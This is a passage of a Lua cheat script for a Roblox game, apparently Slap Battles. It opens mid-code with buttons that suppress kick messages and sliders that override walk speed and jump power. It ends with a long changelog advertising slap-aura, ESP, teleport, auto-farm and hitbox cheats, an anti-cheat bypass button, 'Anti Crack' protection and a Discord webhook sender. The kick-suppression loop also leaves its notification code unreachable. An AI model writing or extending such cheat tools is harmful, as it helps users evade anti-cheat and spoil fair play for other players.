        end

        OrionLib:MakeNotification({
            Name = "Checker",
            Content = "Created Successfully!",
            Image = "rbxassetid://7733919427",
            Time = 3
        })
    end
})

-- ✅ Remove Kick UI
Tab:AddButton({
    Name = "Remove Kick UI",
    Callback = function()
        while true do
            game.GuiService:ClearError()
            wait()
        end

        OrionLib:MakeNotification({
            Name = "Checker",
            Content = "Deleted Successfully!",
            Image = "rbxassetid://7733919427",
            Time = 3
        })
    end
})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

-- WalkSpeed Section
Section = Tab:AddSection({
    Name = "WalkSpeed"
})

local Walkspeed = 20
local KeepWalkspeed = false

Tab:AddSlider({
    Name = "WalkSpeed",
    Min = 0,
    Max = 100,
    Default = Walkspeed,
    Color = Color3.fromRGB(0, 0, 255),
    Increment = 1,
    ValueName = "WalkSpeed",
    Callback = function(Value)
        Walkspeed = Value
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = Value
        end
    end
})

Tab:AddToggle({
    Name = "Walkspeed Auto Change",
    Default = false,
    Callback = function(Value)
        KeepWalkspeed = Value
        while KeepWalkspeed do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.WalkSpeed ~= Walkspeed then
                char.Humanoid.WalkSpeed = Walkspeed
            end
            task.wait()
        end
    end
})

-- JumpPower Section
Section = Tab:AddSection({
    Name = "JumpPower"
})

local Jumppower = 50
local KeepJumppower = false

Tab:AddSlider({
    Name = "JumpPower",
    Min = 0,
    Max = 100,
    Default = Jumppower,
    Color = Color3.fromRGB(0, 0, 255),
    Increment = 1,
    ValueName = "JumpPower",
    Callback = function(Value)
        Jumppower = Value
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.JumpPower = Value
        end
    end
})

Tab:AddToggle({
    Name = "Jumppower Set Auto",
    Default = false,
    Callback = function(Value)
        KeepJumppower = Value
        while KeepJumppower do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.JumpPower ~= Jumppower then
                char.Humanoid.JumpPower = Jumppower
            end
            task.wait()
        end
    end
})

-- CHANGELOGS
local Tab = Window:MakeTab({
    Name = "Changelogs",
    Icon = "rbxassetid://8997387937",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Changelogs Info"
})

Tab:AddParagraph("V. 11.1.8:", [[
-LAUNCHER HUB-
[-] Fully Removed Launcher Hub (i dont have backup versions)
-BADGES HUB-
[+] Added Instant Spawn 75000 Clones (God Hand Uses Your Friend/Alt) Button
[+] Added Collector Tab
[+] Added Click FindTheGlovesTeleport Display Island Button
[+] Added Glaxe Tab
[+] Added Teleport To Slap Royale Place Button
-MASTERY HUB-
[x] Fully Revamped Mastery Hub
-SB HUB MAIN-
[+] Added Teleport To Find The Gloves (1) Place Button
[+] Added Teleport To Find The Gloves (2) Place Button
[+] Added Pineslapple Slap Glove Button In Abuser Tab
[+] Added Collector Badge Glove Button In Abuser Tab
[+] Added Slime Slap Glove Button In Abuser Tab
[+] Added Glaxe Badge Glove Button In Abuser Tab
[+] Added Pinwheel Slap Glove Button In Abuser Tab
-ALL HUBS-
[+] Added How Many Null Shards? (Visual) Textbox
[+] Added Set Null Shards (Visual) Button
[x] Improved Slap Aura Again
-SLAP ROYALE PLACE-
[-] Removed Anti Zone Toggle (Patched/Maybe I Revive Soon)
[-] Removed Anti Lava Toggle (Patched/Maybe I Revive Soon)
-FIND THE GLOVES PLACE-
[+] Added Main Tab
[+] Added Teleport to Random Glove Button
[+] Added Auto Teleport (0.01s) Toggle
[+] Added Auto Solve Gloves (Visible+Solved) Toggle
[+] Added WARNING Paragraph

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 10.0.0:", [[
-LAUNCHER HUB-
[+/x] Fully Fixed And Revived Added Back "Launcher Hub" Script
-BADGES HUB-
[+] Added Shopkeeper Tab
[+] Added Equip Extended Button
[+] Added Equip Sbeve Button
[+] Added Equip OVERKILL Button
[+] Added Click Job Application Paper Button
-MASTERY HUB-
[+] Added Visual Giver Plank Mastery Button
[+] Added Plank Tab
[+] Added Auto Use Plank On Players Toggle
-SLAP FARM HUB-
[x] Fully Fixed And Improved Slap Farm Bot Stuff
[+] Added Anti AFK Toggle

Make sure to use auto enter arena and anti afk if u wanna afk farm slaps
-HELPER HUB-
[+/x] Fully Fixed And Revived Added Back "Helper Hub" Script
-SB HUB MAIN-
[-] Removed Check Server Type Button
[+] Added Load Helper Hub Script Button
[-] Removed Christmas Event Stuff
[x] Changed Jerry Boss Fight (1) Button
[x] Changed Jerry Boss Fight (2) [PATCHED] Button
[x] Changed Snowball Smash 2025 Place (1) Button
[x] Changed Snowball Smash 2025 Place (2) [PATCHED] Button
[+] Added Teleport To You're Hired! Place (1) Button
[+] Added Teleport To You're Hired! Place (2) Button
[-] Removed Snowpeeps ESP Toggle
[+] Added Elf Badge Glove Button In Abuser Tab
[+] Added Shopkeeper Badge Glove Button In Abuser Tab
[+] Added Stilts Glove To Equip Slap Glove Textbox
[+] Added Shopkeeper Glove To Equip Badge Glove Textbox
[-] Removed Hitbox Stuff (Patched)
-ALL HUBS-
[x] Webhook now exists in all hubs
[x] Changed All Hubs To Normal Colors
[+] Added Search Bar Above All Tabs (Now U Can Type To Search)
[x] Refixed Slap Aura Cooldown Sliders (from 0.1 to 2)
[x] Fixed Auto Enter Portals Toggles
[x] Changed All Hubs Loadstrings
[x] Changed Webhook Image (Now Thumbnail Is Normal)
[x] All Hubs Are Now Open Sourced (Not Obfuscated)
-YOU'RE HIRED! PLACE-
[+] Added Info Tab
[+] Added Check Cash Info
[+] Added Check Day Info
[+] Added Auto Set Info Toggle
[+] Added Auto shopkeeper glove obtain - DonjoSx Button
[+] Added auto clean, auto sell glove - BaconScripter Button
Note: My version will be out soon/later

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 9.6.5:", [[
-BADGES HUB-
[+] Added rob Tab
[+] Added Equip Reaper Slap Glove Button
[+] Added Equip Killstreak Slap Glove Button
[+] Added Equip God's Hand Slap Glove Button
[+] Added Equip bob Badge Glove Button
[+] Added Equip Tycoon Badge Glove Button
[+] Added Someone Using Reaper? Button
[+] Added Someone Using Killstreak? Button
[+] Added Someone Using God's Hand? Button
[+] Added Someone Using bob? Button
[+] Added Someone Using Tycoon? Button
[+] Added Teleport To Reaper Button
[+] Added Teleport To Killstreak Button
[+] Added Teleport To God's Hand Button
[+] Added Teleport To bob Button
[+] Added Teleport To Tycoon Button
[+] Added Reaper Slap Aura Button
[+] Added Killstreak Slap Aura Button
[+] Added Use God's Hand Ability Button
[+] Added Use bob Ability Button
[+] Added Auto Click Tycoon Toggle
[+] Added Rhythm Tab
[+] Added Equip Boogie Badge Glove Button
[+] Added Use Boogie Ability Button
[+] Added Boogie Slap Aura Button
[+] Added Druid Tab
[+] Added Teleport to Gardens And Ghouls Place Button
[+] Added Scythe Tab
[+] Added Teleport to Farmland Fray Place Button
[+] Added Santa Tab
[+] Added Teleport to Jerry Boss Fight Place + Auto Get Santa Button
[+] Added Jerry Tab
[+] Added Teleport to Jerry Boss Fight Place + Auto Get Jerry Button
[+] Added Elf Tab
[+] Added Teleport to Snowball Smash 2025 Place Button
-SB HUB MAIN-
[x] Changed Webhook Image (Now Thumbnail Is Christmas)
[x] Fixed Anti Hunter Box Toggle
[x] Fixed Anti Pylon Toggle (Was Sending Notification Randomly)
[+] Added Normal Hubs Section
[+] Added Limited Hubs Section
[+/x] Fully Fixed And Revived Added Back "Halloween Hub" Button
[+/x] Fully Fixed And Revived Added Back "Christmas Hub" Button
[x] Changed From Current Event "None" To "Christmas Event" Label Text
[+] Added Auto Bring Gifts Toggle
[+] Added Teleport To Jerry Boss Fight (1) Button
[+] Added Click All Snowpeeps Button
[+] Added Teleport To Jerry Boss Fight (2) Button
[+] Added Teleport To Snowball Smash 2025 Place (1) Button
[+] Added Teleport To Snowball Smash 2025 Place (2) Button
[x] Changed From Jerry Boss Fight (2) PATCHED to UNPATCHED Button
[+] Added Teleport To Snowball Smash 2025 Place (1) Button
[+] Added Teleport To Snowball Smash 2025 Place (2) Button
[+] Added Snowpeeps ESP Toggle
[+] Added Elf Glove To Equip Badge Glove Textbox
-ALL HUBS-
[x] Fully Fixed/Improved Slap Aura Toggles
-SNOWBALL SMASH 2025 PLACE-
[+] Added Main Tab
[+] Added Players ESP Toggle
[+] Added Items ESP Toggle
[+] Added [V2] 🎄 GET ELF GLOVE - DonjoSx Button
[+] Added [☃️CHRISTMAS] Slap Battles Script - BaconScripter Button

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 9.0.5:", [[
-BADGES HUB-
[+] Added Equip Eggler Badge Glove Button
[+] Added Equip Fan Badge Glove Button
[+] Added Equip Scythe Badge Glove Button
[+] Added Equip Snow Badge Glove Button
[+] Added Auto Slap Aura Players
[-] Removed Auto Get Conker Glove Button
[x] Improved/Fixed Slap Aura Toggle
-MASTERY HUB-
[+] Added Visual Giver Tinkerer Mastery Button
[+] Added Tinkerer Badge Glove Mastery Tab
[+] Added Auto Spawn Frenzy Bots Button
[+] Added Auto Slap Aura Players Button
[x] Improved/Fixed Slap Aura Toggle
-SLAP FARM HUB-
[-] Removed Bot Slap Farm Toggle
[+] Added Auto Slap Players Toggle
[x] Improved/Fixed Slap Aura Toggle
-SB HUB MAIN-
[+] Added Anti Pylon Toggle
[x] Changed Recall Answer Total Gloves Text
[+] Added Butcher Slap Glove (E) Button In Abuser Tab
[+] Added Butcher Slap Glove (R) Button In Abuser Tab
[+] Added Butcher Glove To Equip Slap Glove Textbox
[x] Improved Slap Aura Toggle (Now Supports Glove: Butcher)

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 8.8.8:", [[
-MASTERY HUB-
[+] Added Visual Giver BONK Mastery Button
[+] Added Visual Giver Rage Mastery Button
[+] Added Rage Glove Mastery Tab
[+] Added Auto Slap (Slap Aura) Button
[+] Added Use Rage Ability Button
-BADGES HUB-
[+] Added Wheelchair Glove Badge Tab
[+] Added Someone Using Tableflip? Button
[+] Added Someone Using Blasphemy? Button
[+] Added Someone Using Bull? Button
[+] Added Someone Using Bomb? Button
[+] Added Someone Using L.O.L.B.O.M.B? Button
[+] Added Someone Using Slicer? Button
[+] Added Teleport To Tableflip Player Button
[+] Added Teleport To Blasphemy Player Button
[+] Added Teleport To Bull Player Button
[+] Added Teleport To Bomb Player Button
[+] Added Teleport To L.O.L.B.O.M.B Player Button
[+] Added Teleport To Slicer Player Button
[+] Added Anti Ragdoll Toggle
[+] Added Anti Void Button
-SB HUB MAIN-
[+] Added Check Server Type Button
[+] Added Show Server Type Text
[+] Added Anti Hunter Box Toggle
[x] Changed Recall Answer Total Gloves Text
[x] Fixed Slap Aura V2 Toggle
[+] Added Hitbox Size Slider
[+] Added Enable/Disable Players Hitbox Toggle
[+] Added Leafblower Slap Glove Button In Abuser Tab
[+] Added Wheelchair Slap Glove Button In Abuser Tab
[+] Added Leafblower Glove To Equip Slap Glove Textbox
[+] Added Wheelchair Glove To Equip Badge Glove Textbox

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 8.5.7:", [[
-BADGES HUB-
[+] Added Conker Tab
[+] Added Auto Teleport To Conker Place + Get Conker (credits to kizzy) Button
-SB HUB MAIN-
[+] Added Teleport To Conker Obtainment (1) Button
[+] Added Teleport To Conker Obtainment (2) Button
[x] Changed Recall Answers
[+] Added Conker Badge Glove Button In Abuser Tab
[+] Added Conker Glove To Equip Badge Glove Textbox

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 8.5.0:", [[
[x] Changed Webhook Image (Now Thumbnail Is Normal)
[-] Removed Limited Section
[-] Removed Check Candy Corns Info
[-] Removed Obtainable Halloween Gloves Are Info
[-] Removed Badges Tab
[-] Removed Mastery Tab
[-] Removed Slap Farm Tab
[+] Added Hubs Tab
[+/x] Fully Fixed And Revived Added Back "Badges Hub" Button
[+/x] Fully Fixed And Revived Added Back "Masteries Hub" Button
[+/x] Fully Fixed And Revived Added Back "Slap Farm Hub" Button
[x] Changed From "Current Event: Halloween Event" To "Current Event: None" Info At Event Tab
[x] Changed Location Of Choose Option For Auto Candy Corns (Located At Badges Hub)
[x] Changed Location Of Auto Collect Candy Corns (Located At Badges Hub)
[x] Changed Location Of Auto Serverhop Candy Corns (Located At Badges Hub)
[-] Removed Equip Killstreak Glove Button
[-] Removed Killstreak Slap Aura Button
[x] Changed Location Of Detected Grave Info (Located At Info Tab)
[x] Changed Location Of Grave ESP Toggle (Located At ESP Tab)
[x] Changed Location Of Zombies (1) [WORKS] Button (Located At Teleport Tab)
[x] Changed Location Of Zombies (2) [PATCHED] Button (Located At Teleport Tab)
[x] Changed Location Of Pim's Corn Maze (1) [WORKS] Button (Located At Teleport Tab)
[x] Changed Location Of Pim's Corn Maze (1) [PATCHED] Button (Located At Teleport Tab)
[x] FULLY Improved All ESP Toggles (No More Lag + Shows Highlight)
[x] Changed Recall Answers
[+] Added DonjoSx's Discord Server Link Button (For Scripts)
[+] Added SPRG Squad's Discord Server Link Button (For Scripts)
[+] Added Herkle's Discord Server Link Button (For Scripts)
[+] Added Kizzy's Discord Server Link Button (For Scripts)
[+] Added Riftshot Glove Button In Abuser Tab (Badge Type)
[+] Added Automaton Glove Button In Abuser Tab (Slap Type)
[+] Added Baldi basic Button (DonjoSx)
[+] Added Gojo [unpatching] Button (DonjoSx)
[+] Added MUI Button (DonjoSx)
[+] Added Killerfish Walmart Button (DonjoSx)
[x] FULLY Changed all Buttons (SPRG)
[+] Added Kizzy Section
[+] Added Despair Button (Kizzy)
[+] Added DonjoSx To Credits Tab
[+] Added SPRG To Credits Tab
[+] Added Herkle To Credits Tab
[+] Added Kizzy To Credits Tab
[+] Added Automaton Glove To Equip Slap Glove Textbox
[+] Added Riftshot Glove To Equip Badge Glove Textbox
-SLAP ROYALE PLACE-
[x] Fixed Get Lab Code Button
[x] Fixed Get Chain Button
-BARZIL PLACE-
[x] FULLY CHANGED TABS/BUTTONS

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 5.1.7:", [[
[+] Added Debug Section In Slap Farm Tab
[+] Added Player Selection Section
[+] Added Select Player Dropdown
[+] Added Refresh Players List Button
[+] Added Auto Spawn Cube Toggle
[+] Added Auto Teleport Section
[+] Added Auto Touch Cube's Selected Player Toggle
[+] Added Auto Touch To Any Cube Toggle
[+] Added Smiler Glove In Abuser Tab
[+] Added Smiler Glove To Equip Slap Glove Textbox
[-] Removed Secret Tab
-Pim's Corn Maze-
[+] Added Auto Section
[+] Added Auto Get Harvester Glove Button (Credits To: Inco)
[x] Fixed Teleport To Exit (1, 2, 3 and 4 Mazes) Button (Kinda Works)
[+] Added Teleport To Glove (5 Maze) Button
[+] Added Teleport To Finish (Last Maze) Button
[+] Added Auto Set Proximity Prompt (0 Sec CD) Toggle (Kinda Laggy)
[+] Added Enable/Disable Fly Toggle
[+] Added Enable/Disable Noclip Toggle

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 5.0.0:", [[
[x] Changed Webhook Image (Now Thumbnail Is Halloween)
[x] Changed Startup Notification
[+] Added Limited Info Section In Info Tab
[+] Added Check Candy Corns Info
[+] Added Obtainable Halloween Gloves Are Paragpraph Info
[+] Added Normal Info Section In Info Tab
[x] Changed From "Halloween (SOON)" To "Halloween Event" Label Text
[+] Added Candy Cone Farm Section In Event Tab
[+] Added Choose Option To Auto Collect Candy Corns Dropdown
List To Choose: (Teleport, Bring)
[+] Added Auto Collect Candy Corns (Normal)
[+] Added Auto Serverhop Collect Candy Corns (Fast)
[+] Added Grave Settings Section In Event Tab
[+] Added Equip Killstreak Glove (5k.+ Slaps Need) Button
[+] Added Killstreak Slap Aura Button
[+] Added Is Grave Spawned? Info
[+] Added Auto Set Gravestone Info Toggle
[+] Added Click On Grave Button
[+] Added Grave ESP Toggle
[+] Added Poltergeist Place Section In Event Tab
[+] Added Teleport To Zombies (1) Place Button (PLACE ID)
[+] Added Teleport To Zombies (2) Place Button (POSITION TP)
[+] Added Harvester Place Section In Event Tab
[+] Added Teleport To Pim's Corn Maze (1) Place Button (PLACE ID)
[+] Added Teleport To Pim's Corn Maze (2) Place Button (PART TP)
[x] Changed Teleport To Zombies Place Position From (Removed) To Normal Section
[x] Changed Name From "Zombies" To "Zombies (1)" In Teleport Tab
[+] Added Teleport To Zombies (2) Place Button
[+] Added More Teleports To Universal Teleports Dropdown In Teleport Tab
List: (Slapple Island, Cloud, Debug Room, Slapple and Candy Corn)
[+] Added Harvester Glove To Equip Badge Glove Textbox
-ZOMBIES PLACE-
[+] Added Main Tab
[+] Added Slap Aura Enemies (No Loop) Button (IT DOESNT HAVE TO BE LOOPED OTHERWISE THEY FLY)
[+] Added Players ESP Toggle
[+] Added Enemies ESP Toggle
[+] Added Destroy Gui Button
-PIM'S CORN MAZE-
[+] Added Main Tab
[+] Added Teleports Section
[+] Added Teleport To Exit (1, 2, 3 and 4) Button
[+] Added ESP Feature Section
[+] Added Players ESP Toggle
[+] Added Enemies ESP Toggle
[+] Added Exit ESP Toggle
[+] Added Others Section
[+] Added Remove Blur Effects Button
[+] Added Full Bright Toggle
[+] Added Destroy Gui Button

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 4.5.0:", [[
[+] Added Universal Section In Anti Tab
[+] Added Anti Glove Abilities Section In Anti Tab
[x] Changed Locations In Anti Tab
[+] Added Anti Toggle Ideas Paragraph
[x] Fixed Get Acrobat Glove Button (50% Works)
[+] Added Get Lag Glove Button (Sets Ur Ping To 100 Then Gets U Badge And After 10 Seconds It Sets Ur Ping Back To 0 Which Is Default)
[x] Changed Name "Get Duck" - "Get Duck Badge" Button
[x] Changed Name "Get Orange" - "Get Lone Orange Badge" Button
[x] Changed Name "Get Court Evidence" - "Get Court Evidence Badge" Button
[x] Fixed/Changed Name "Get Jupiter" - "Get Jupiter Glove" Button
[x] Changed Name "Get Run Glove" - "Auto Get Run Glove" Toggle
[+] Added New Message To Dropdown (Glove: Debug)
[+] Added Cherry Mastery Section
[+] Added Auto Spawn Cherry Clones Toggle
[x] Changed Position With Phase/Bomb Mastery Sections
[+] Added Shard Mastery Section
[+] Added Auto Use Shard's Glove Ability Toggle
[+] Added Shard's Glove (Slap Aura) Button
[x] Changed Moai Mastery To 🗿 Mastery Section
[+] Added Moon Mastery Section
[+] Added Auto Knockback & Teleport To Island Toggle
[+] Added Auto Equip/Unequip Moon Glove Toggle
[+] Added Chain Mastery Section
[+] Added Auto Slap Players Toggle In Chain Mastery Section
[+] Added Free Cherry Glove Mastery FE Button
[+] Added Free Shard Glove Mastery FE Button
[+] Added Free Moon Glove Mastery FE Button
[+] Added Free Chain Glove Mastery FE Button
[x] Fixed Auto Serverhop Collect Slapples Button
[x] Improved Bot Slap Farmer With 3 Type Of Brains (Low, Normal, High)
[x] Changed Event From Takeover To Halloween (SOON)
[+] Added Teleport To Splatbattles - Regular Place (1) Button
[+] Added Teleport To Splatbattles - Regular Place (2) Button
[+] Added Teleport To Plate glove obtainment Place (1) Button
[x] Changed From Randomizer Gamemode (2) To Randomizer Gamemode (2) [PATCHED] Button
[+] Added Teleport To Splatbattles - Championship Place Button (To Removed Place)
[x] Fully Fixed All Universal Teleports Dropdown/Button
[x] Changed Recall Answer How Many Gloves Are In Game? Paragpragh
[x] Fully Changed Scripts Tab
[x]-[+] Fixed/Added More Gloves In Abuser Tab
[-] Removed Give All Badge Gloves (Cannot Be Undone) Button [PATCHED]
[-] Removed Type Name of Glove to Give Yourself Textbox [PATCHED]
[-] Removed Give Badge Glove (Cannot Be Undone) Button [PATCHED]
[-] Removed Paragraph Free Gloves (Not Gives) List
[x] Fixed Type Ur Own Any Nametag Textbox
[+] Added Change Nametag Button
[+] Added Auto Change Nametag Toggle
[+] Added Pylon Glove To Equip Slap Glove Textbox
[+] Added Walrus Glove To Equip Slap Glove Textbox
[+] Added Plate Glove To Equip Badge Glove Textbox
[+] Added Lag Glove To Equip Badge Glove Textbox
[+] Added Teleport To Default Arena Button
-TAKEOVER REGULAR PLACE-
[x] Fixed Slap Aura
[+] Added ESP Bots Toggle
[+] Added Round Results Gui Dropdown
[+] Added Show/Hide Round Results (So Wont Get Stuck) Button
-PLATE GLOVE OBTAINMENT PLACE-
[+] Added Main Tab
[+] Added Auto Remove Wall/Lava Button
[+] Added Touch Glove (Make Sure Glove Spawned) Button
[+] Added Destroy Gui Button

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.9.5:", [[
[+] Added Is Tape Recorder Spawned? Info
[x] Fixed Auto Set Info
[+] Added Retribution Glove To Equip Slap Glove Textbox
[+] Added Architect Glove To Equip Slap Glove Textbox

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.9.1:", [[
[x] Fixed Get Duck Badge (Changed Default Arena Name)
[x] Changed Event (Current Event: Takeover)
[+] Added Supported Places (Takeover [Regular and Championship])
[+] Added Choose How Want To Teleport? Dropdown
[+] Added Teleport Button
[x] Changed Randomizer Gamemode (1 and 2) They In Removed/Forgotten/Other Places Section
[+] Added Paint Glove To Equip Badge Glove Textbox
-TAKEOVER (REGULAR + CHAMPIONSHIP) PLACE-
[+] Added Info Tab
[+] Added Check Timer Info
[+] Added Check Team Magenta Info
[+] Added Check Team Green Info
[+] Added Check Team Cyan Info
[+] Added Auto Set Info Toggle
[+] Added Main Tab
[+] Added Slap Aura Toggle
[+] Added Auto Use Ability Toggle
[+] Added Walkspeed Slider
[+] Added Jumpower Slider
[+] Added Infinite Yield Button
[+] Added Destroy Gui Button
[x] Fixed Destroy Gui Button (Now Supports All Places)

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.6.9:", [[
[x] Fixed Discord Webhook Sender (Job Id/Join Link = Removed)
[+] Added Get Code For Debug Glove Button
[+] Added Get Debug Glove Button
[+] Added Debug Glove To Equip Badge Glove Textbox

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.6.5:", [[
[+] Added BONK Glove Mastery Support In Mastery Tab
[+] Added Auto Slap Players Toggle (BONK Mastery)
[+] Added Inf Spam BONK's Hammer Button (BONK Mastery)
[+] Added Grenadier Glove To Equip Slap Glove Textbox

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.6.1:", [[
[+] Added Support To Place Name (Randomizer Gamemode)
[+] Added Bypass Anti Cheat Button (Supports Good Executors Only)
[+] Added Anti Balloony Toggle
[+] Added Anti Boogie Ball Toggle
[x] Fixed Get Bob Glove Button (Doesnt enable if dont have 65k+ slaps)
[x] Fixed Get Link Glove Button (Doesnt enable if dont have 50k+ slaps)
[x] Fixed Get 🗿 Glove Button (Equip Trap and Enter Arena)
[x] Fixed Auto Get Megarock Toggle (Equip Rock and Enter Arena)
[x] Fixed Auto Get Bubble Glove (1) Toggle (Can Be Stopped + 0.9 Slap Faster)
[x] Changed Auto Get Bubble Glove (2) [Slap Aura] Toggle (1 Slap Faster = 0.9 Slap Faster)
[x] Fixed Auto Get Trap Glove (Equip Brick and Enter Arena)
[x] Fixed Auto Get Disarm Glove (1) Toggle (Can Be Stopped + 0.9 Slap Faster)
[x] Changed Auto Get Disarm Glove (2) [Slap Aura] Toggle (1 Slap Faster = 0.9 Slap Faster)
[x] Fixed Auto Get Buddies Glove (1) Toggle (Can Be Stopped + 0.9 Slap Faster)
[x] Changed Auto Get Buddies Glove (2) [Slap Aura] Toggle (1 Slap Faster = 0.9 Slap Faster)
[x] Fixed Auto Get RNG Glove (1) Toggle (Can Be Stopped + 0.9 Slap Faster)
[x] Changed Auto Get RNG Glove (2) [Slap Aura] Toggle (1 Slap Faster = 0.9 Slap Faster)
[x] Fixed Auto Get Fish Glove Button (Equip ZZZZZZZ and Enter Arena)
[x] Fixed Auto Get Voodoo Glove Button (Equip Ghost and Enter Arena)
[x] Fixed Auto Get Alchemist Glove (1) Toggle (Can Be Stopped + 0.9 Slap Faster)
[x] Changed Auto Get Alchemist Glove (2) [Slap Aura] Toggle (1 Slap Faster = 0.9 Slap Faster)
[+] Added Auto Get Bounty Glove (1) Toggle
[+] Added Auto Get Bounty Glove (2) [Slap Aura] Toggle
[x] Fixed Dual Slap Farm Toggle (Can Be Stopped + 0.9 Slap Faster)
[-] Removed Baller Slap Farm Toggle
[+] Added Angler Slap Farm (Auto Fishing) Toggle
[+] Added Bounty Slap Farm (1) Toggle
[+] Added Bounty Slap Farm (2) [Slap Aura] Toggle
[+] Added Auto Give Yourself Cards Toggle
[+] Added Teleport To Evil Barzil (1) Button
[+] Added Teleport To Evil Barzil (2) Button
[+] Added Teleport To Randomizer Gamemode (1) Button
[+] Added Teleport To Randomizer Gamemode (2) Button
[x] Changed Recall Answer Total Gloves Text
[x] Changed Fully Scripts Tab
[+] Added Mobile Support To Admin Gloves Tab
[x] Fixed Admin Gloves Tab (Both PC/Mobile Supports)
[x] Fixed Abuser Tab (Added More Gloves To Support)
[+] Added Get Any Badge Glove (By Typing Name Of Glove)
[+] Added Bounty Glove To Equip Badge Glove Button
-ELUDE PLACE-
[+] Added Total Arificats Collected Info
[+] Added Timer Info
[+] Added Pim Is Spawned? Info
[+] Added Auto Set Info
[+] Added Teleport To 1 Artificat Button
[+] Added Teleport To 2 Artificat Button
[+] Added Teleport To 3 Artificat Button
[+] Added Teleport To 4 Artificat Button
[+] Added Touch All Artificats Button
[+] Added Full Bright Toggle
[+] Added Infinite Yield Button
-EVIL BARZIL PLACE-
[x] Changed Main-Dave Tab
[+] Added Auto Set PP (ProximityPrompt) Cooldown To 0 Second Button
[+] Added Equip All C4's Toggle
[+] Added Main-Mortis Tab
[+] Added Teleport To ??? (Hardmode) Door Button
[+] Added Teleport To Cursed Dice Button
[+] Added Teleport Boss Fight Button
[+] Added Same Buttons/Toggles From Main-Dave Tab To Main-Mortis Tab

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.0.4:", [[
[x] Fixed Teleport To barzil (2) Button
[+] Added Stick Mastery Support (1 Quest)
[x] Changed Equip Slap Glove Textbox
[+] Added Visual Giver Stick Mastery Button

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

Tab:AddParagraph("V. 3.0.0:", [[
[x] Fixed Anti Barzil Portal (Model Problems)
[x] Fixed Slap Aura V1 (Maked Lags)
[x] Fixed Teleport To barzil (2) (Changed Position)
[+] Added Dave Glove Equip Badge Glove
[+] Added mortis Glove Equip Badge Glove
[+] Added Stick Glove Equip Other Glove
-BARZL- PLACE
[+] Added Teleport To (Evil Barzil) Place
[+] Added Remove All Landmines
-EVIL BARZIL- PLACE
[+] Added Teleport To Key Button (Stage 1)
[+] Added Teleport To Gate Button (Stage 1)
[+] Added Teleport To Cyan Portal Button (Stage 1)
[+] Added Teleport To Stepladder Button (Stage 2)
[+] Added Teleport To Screwdriver Button (Stage 2)
[+] Added Teleport To Broken Thing Button (Stage 2)
[+] Added Teleport To Small Hammer/Large Hammer Button (Stage 2)
[+] Added Teleport To Locked Door Button (Stage 3)
[+] Added Teleport To Window Button (Stage 3)
[+] Added Teleport To Boss Fight Button (Stage 3)
[+] Added Teleport To Random C4 Button (Stage BOSS)
[+] Added Safe Zone Toggle (Stage BOSS)
[+] Added Teleport To Safe Zone Button (Stage BOSS)
[+] Added Teleport To barzil (1) Button (Others)
[+] Added Teleport To barzil (2) Button (Others)
[+] Added Teleport To Slap Battles Button (Others)
[+] Added Full Bright Toggle (Others)
[+] Added Infinite Yield (Use ;fly) Button (Others)

Settings:
[+] = Added
[x] = Fixed/Changed
[-] = Removed
]])

-- Version 2.6.5
Tab:AddParagraph("V. 2.6.5:", [[
[x] Fixed Discord Webhook & Added Anti Crack 
[x] Changed Loading Script
[x] Removed Config From Window
[+] Added Show Owned Gamepasses (Prints) Button Info
[x] Changed Show Obtained Gloves (Prints) Button Info
[x] Changed Instant Get [REDACTED] Glove (No Slap Need Anymore)
[x] Fixed Get Orbit/Rojo Gloves Button
[x] Changed Get Moai Glove 🗿
[x] Changed Auto Get Siphon Glove (No Slap Need Anymore)
[-] Removed Get Code For Knockoff Glove Button
[+] Added Auto Get Knockoff Glove
[x] Fixed Get Jupiter Glove
[x] Fixed Get Bob Plushie Button
[x] Fully Fixed Auto Get Slender Glove
[x] Fully Changed Auto Get Eggler Glove
[x] Changed Select Gloves To Message Dropdown With Button
[+] Added Auto Get Car Keys Glove
[+] Added Auto Voodoo Glove Mastery
[+] Added Auto Car Keys Glove Mastery
[+] Added Auto Ultra Instinct Glove Mastery
[+] Added Instant Giver Voodoo Mastery
[+] Added Instant Giver Car Keys Mastery
[x] Changed Teleport To Slap Battles Place (Normal)
[+] Added Teleport To Slap Cart Place (1)
[+] Added Teleport To Slap Cart Place (2)
[+] Added Teleport To The Suction Trials Place (1)
[+] Added Teleport To The Suction Trials Place (2)
[+] Added Teleport To Shattered Reality Place (1)
[+] Added Teleport To Shattered Reality Place (2)
[+] Added Ignore Oneshots? Toggle For AI
[x] Fixed All ESP Toggles
[+] Added Keypad ESP Toggle
[+] Added Error Stand Glove ESP Toggle
[+] Added Hitman NPC ESP Toggle
